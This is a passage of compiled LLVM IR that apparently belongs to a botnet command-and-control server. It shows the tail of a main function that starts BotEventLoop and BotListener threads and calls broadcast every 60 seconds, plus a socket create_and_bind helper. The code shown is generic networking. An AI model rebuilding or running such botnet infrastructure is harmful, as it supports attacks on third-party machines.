  %53 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %53, i32* @epollFD, align 4
  %54 = load volatile i32, i32* @epollFD, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %52
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.73, i64 0, i64 0))
  call void @abort() #11
  unreachable

57:                                               ; preds = %52
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %60 = bitcast %union.epoll_data* %59 to i32*
  store i32 %58, i32* %60, align 1
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %61, align 1
  %62 = load volatile i32, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @listenFD, align 4
  %64 = call i32 @epoll_ctl(i32 %62, i32 1, i32 %63, %struct.epoll_event* %11) #9
  store i32 %64, i32* %8, align 4
  %65 = load i32, i32* %8, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %57
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.6, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %57
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 2
  %71 = zext i32 %70 to i64
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %12, align 8
  %73 = alloca i64, i64 %71, align 16
  store i64 %71, i64* %13, align 8
  br label %74

74:                                               ; preds = %78, %68
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %75, -1
  store i32 %76, i32* %9, align 4
  %77 = icmp ne i32 %75, 0
  br i1 %77, label %78, label %84

78:                                               ; preds = %74
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 1
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i64, i64* %73, i64 %81
  %83 = call i32 @pthread_create(i64* %82, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %74, !llvm.loop !20

84:                                               ; preds = %74
  %85 = getelementptr inbounds i64, i64* %73, i64 0
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = inttoptr i64 %87 to i8*
  %89 = call i32 @pthread_create(i64* %85, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %88) #9
  br label %90

90:                                               ; preds = %91, %84
  br label %91

91:                                               ; preds = %90
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.74, i64 0, i64 0))
  %92 = call i32 @sleep(i32 60)
  br label %90
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.76, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 %31, i32 %34, i32 %37) #9
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 %43, i32 1, i32 2, i8* %44, i32 4) #9
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.77, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 %49, %struct.sockaddr* %52, i32 %55) #9
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !21

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %71, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.78, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %74) #9
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { argmemonly nofree nounwind willreturn writeonly }
attributes #5 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #6 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #7 = { nofree nosync nounwind willreturn }
attributes #8 = { nounwind readonly willreturn }
attributes #9 = { nounwind }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
